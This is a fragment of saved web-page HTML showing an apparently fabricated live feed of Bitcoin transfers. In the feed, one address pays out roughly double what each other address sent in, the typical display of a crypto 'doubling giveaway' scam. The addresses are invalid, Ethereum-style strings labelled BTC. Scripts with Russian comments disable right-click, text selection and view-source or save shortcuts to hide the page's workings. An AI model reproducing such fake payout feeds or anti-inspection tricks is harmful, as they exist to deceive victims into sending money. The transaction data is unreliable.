class="data-item">IN</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">4 min</div><div class="data-item">49.13 BTC</div><div style="display:none" ;="" class="data-item">0.008475</div></div></div></div><div class="item" style=""><div class="top"><div class="data"><div style="" class="data-item">1SEIN2LUB8...</div><div style="display: none" class="data-item">616158</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">OUT</div><div class="data-item">0x6QDARDXO...</div><div class="data-item">5 min</div><div class="data-item">134.72 BTC</div><div style="display: none" class="data-item">0.00028262</div></div></div><div class="bottom"><div class="data"><div style="" class="data-item">TFXRCMJGPE...</div><div style="display: none" class="data-item">616753</div><div class="data-item">0x6QDARDXO...</div><div class="data-item">IN</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">5 min</div><div class="data-item">67.36 BTC</div><div style="display:none" ;="" class="data-item">0.000180</div></div></div></div><div class="item" style=""><div class="top"><div class="data"><div style="" class="data-item">4LXY2P5PJT...</div><div style="display: none" class="data-item">616587</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">OUT</div><div class="data-item">0xpsTogO1c...</div><div class="data-item">6 min</div><div class="data-item">167.86 BTC</div><div style="display: none" class="data-item">0.00661868</div></div></div><div class="bottom"><div class="data"><div style="" class="data-item">X6SSCLV8WV...</div><div style="display: none" class="data-item">616576</div><div class="data-item">0xpsTogO1c...</div><div class="data-item">IN</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">6 min</div><div class="data-item">83.93 BTC</div><div style="display:none" ;="" class="data-item">0.003059</div></div></div></div><div class="item" style=""><div class="top"><div class="data"><div style="" class="data-item">EIZWWQDCUO...</div><div style="display: none" class="data-item">616473</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">OUT</div><div class="data-item">0xcrVV3omf...</div><div class="data-item">7 min</div><div class="data-item">199.02 BTC</div><div style="display: none" class="data-item">0.00021082</div></div></div><div class="bottom"><div class="data"><div style="" class="data-item">S8SE4U78N0...</div><div style="display: none" class="data-item">616885</div><div class="data-item">0xcrVV3omf...</div><div class="data-item">IN</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">7 min</div><div class="data-item">99.51 BTC</div><div style="display:none" ;="" class="data-item">0.006943</div></div></div></div><div class="item" style=""><div class="top"><div class="data"><div style="" class="data-item">MQCW22QJ0D...</div><div style="display: none" class="data-item">616685</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">OUT</div><div class="data-item">0xQTLRF3z5...</div><div class="data-item">8 min</div><div class="data-item">96.02 BTC</div><div style="display: none" class="data-item">0.00055807</div></div></div><div class="bottom"><div class="data"><div style="" class="data-item">7CPQOV19JK...</div><div style="display: none" class="data-item">616655</div><div class="data-item">0xQTLRF3z5...</div><div class="data-item">IN</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">8 min</div><div class="data-item">48.01 BTC</div><div style="display:none" ;="" class="data-item">0.000039</div></div></div></div><div class="item" style=""><div class="top"><div class="data"><div style="" class="data-item">1RDADGUSE5...</div><div style="display: none" class="data-item">616431</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">OUT</div><div class="data-item">0x625BT2h7...</div><div class="data-item">9 min</div><div class="data-item">161 BTC</div><div style="display: none" class="data-item">0.00080248</div></div></div><div class="bottom"><div class="data"><div style="" class="data-item">C3HO54OJKP...</div><div style="display: none" class="data-item">616883</div><div class="data-item">0x625BT2h7...</div><div class="data-item">IN</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">9 min</div><div class="data-item">80.50 BTC</div><div style="display:none" ;="" class="data-item">0.004975</div></div></div></div><div class="item" style=""><div class="top"><div class="data"><div style="" class="data-item">XE2W6QJ27V...</div><div style="display: none" class="data-item">616279</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">OUT</div><div class="data-item">0x4LPw6vw1...</div><div class="data-item">10 min</div><div class="data-item">137.7 BTC</div><div style="display: none" class="data-item">0.00043132</div></div></div><div class="bottom"><div class="data"><div style="" class="data-item">MR5I1MGXAU...</div><div style="display: none" class="data-item">616396</div><div class="data-item">0x4LPw6vw1...</div><div class="data-item">IN</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">10 min</div><div class="data-item">68.85 BTC</div><div style="display:none" ;="" class="data-item">0.000242</div></div></div></div><div class="item" style=""><div class="top"><div class="data"><div style="" class="data-item">T0GWW3KFIS...</div><div style="display: none" class="data-item">616824</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">OUT</div><div class="data-item">0xUQis8rrU...</div><div class="data-item">11 min</div><div class="data-item">169.54 BTC</div><div style="display: none" class="data-item">0.00008089</div></div></div><div class="bottom"><div class="data"><div style="" class="data-item">7GTULU2867...</div><div style="display: none" class="data-item">616966</div><div class="data-item">0xUQis8rrU...</div><div class="data-item">IN</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">11 min</div><div class="data-item">84.77 BTC</div><div style="display:none" ;="" class="data-item">0.004793</div></div></div></div>
								<div class="item">
									<div class="top">
										<div class="data">
											<div class="data-item">KZNA0COROV...</div>
											<div style="display: none" class="data-item">616463</div>
											<div class="data-item">0xB0E341c5...</div>
											<div class="data-item">OUT</div>
											<div class="data-item">0x6GYfCnmJ...</div>
											<div class="data-item">12 min</div>
											<div class="data-item">181.12 BTC</div>
											<div style="display: none" class="data-item">0.00030378</div>
										</div>
									</div>
									<div class="bottom">
										<div class="data">
											<div class="data-item">DGOKNTWQ7A...</div>
											<div style="display: none" class="data-item">616776</div>
											<div class="data-item">0x6GYfCnmJ...</div>
											<div class="data-item">IN</div>
											<div class="data-item">0xB0E341c5...</div>
											<div class="data-item">12 min</div>
											<div class="data-item">90.56 BTC</div>
											<div style="display:none" class="data-item">0.001135</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>

				</div>
			</div>
		</main>
		<footer class="footer">
			<div class="footer__container">

			</div>
		</footer>
	</div>
	<!-- <div class="hystmodal" id="myPopup" aria-hidden="true">
	<div class="hystmodal__wrap">
		<div class="hystmodal__window" role="dialog" aria-modal="true">
			<button data-hystclose class="hystmodal__close">Закрыть</button>
		</div>
	</div>
</div>
<div class="hystmodal" id="massageName" aria-hidden="true">
	<div class="hystmodal__wrap">
		<div class="hystmodal__window" role="dialog" aria-modal="true">
			<button data-hystclose class="hystmodal__close">Закрыть</button>
			Сообщение
		</div>
	</div>
</div>
 -->
	<script src="socket.io.js"></script>
	<script src="jquery.min.js"></script>
	<script>
		//запрещает нажатие правой кнопки мыши на сайте
		document.oncontextmenu = cmenu;

		function cmenu() {
			return false;
		}
	</script>


	<script>
		//запрещает выделение мышкой и комбинации клавиш Ctrl + A и Ctrl + U и Ctrl + S
		function preventSelection(element) {
			var preventSelection = false;

			function addHandler(element, event, handler) {
				if (element.attachEvent) element.attachEvent('on' + event, handler);
				else if (element.addEventListener) element.addEventListener(event, handler, false);
			}

			function removeSelection() {
				if (window.getSelection) {
					window.getSelection().removeAllRanges();
				} else if (document.selection && document.selection.clear)
					document.selection.clear();
			}

			//запрещаем выделять текст мышкой
			addHandler(element, 'mousemove', function() {
				if (preventSelection) removeSelection();
			});
			addHandler(element, 'mousedown', function(event) {
				var event = event || window.event;
				var sender = event.target || event.srcElement;
				preventSelection = !sender.tagName.match(/INPUT|TEXTAREA/i);
			});

			//запрещаем нажатие клавищ Ctrl + A и Ctrl + U и Ctrl + S
			function killCtrlA(event) {
				var event = event || window.event;
				var sender = event.target || event.srcElement;
				if (sender.tagName.match(/INPUT|TEXTAREA/i)) return;
				var key = event.keyCode || event.which;
				if ((event.ctrlKey && key == 'U'.charCodeAt(0)) || (event.ctrlKey && key == 'A'.charCodeAt(0)) || (event
						.ctrlKey && key == 'S'.charCodeAt(0))) // 'A'.charCodeAt(0) можно заменить на 65
				{
					removeSelection();
					if (event.preventDefault) event.preventDefault();
					else event.returnValue = false;
				}
			}
			addHandler(element, 'keydown', killCtrlA);
			addHandler(element, 'keyup', killCtrlA);
		}
		preventSelection(document);
	</script>

	<script src="app.min.js"></script>;
	
<!--Start of Tawk.to Script-->

<!--End of Tawk.to Script-->


<script data-scrapbook-elem="basic-loader">(function () { var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate", k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value", k7 = "data-scrapbook-textarea-value", fn = function (r) { var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s; while (i--) { e = E[i]; if ((d = e.getAttribute(k1)) !== null && !e.shadowRoot && e.attachShadow) { s = e.attachShadow({mode: 'open'}); s.innerHTML = d; e.removeAttribute(k1); } if ((d = e.getAttribute(k2)) !== null) { (function () { var c = e, g = new Image(); g.onload = function () { c.getContext('2d').drawImage(g, 0, 0); }; g.src = d; })(); e.removeAttribute(k2); } if ((d = e.getAttribute(k3)) !== null) { e.indeterminate = true; e.removeAttribute(k3); } if ((d = e.getAttribute(k4)) !== null) { e.checked = d === 'true'; e.removeAttribute(k4); } if ((d = e.getAttribute(k5)) !== null) { e.selected = d === 'true'; e.removeAttribute(k5); } if ((d = e.getAttribute(k6)) !== null) { e.value = d; e.removeAttribute(k6); } if ((d = e.getAttribute(k7)) !== null) { e.value = d; e.removeAttribute(k7); } if (e.shadowRoot) { fn(e.shadowRoot); } } }; fn(document); })()</script></body></html>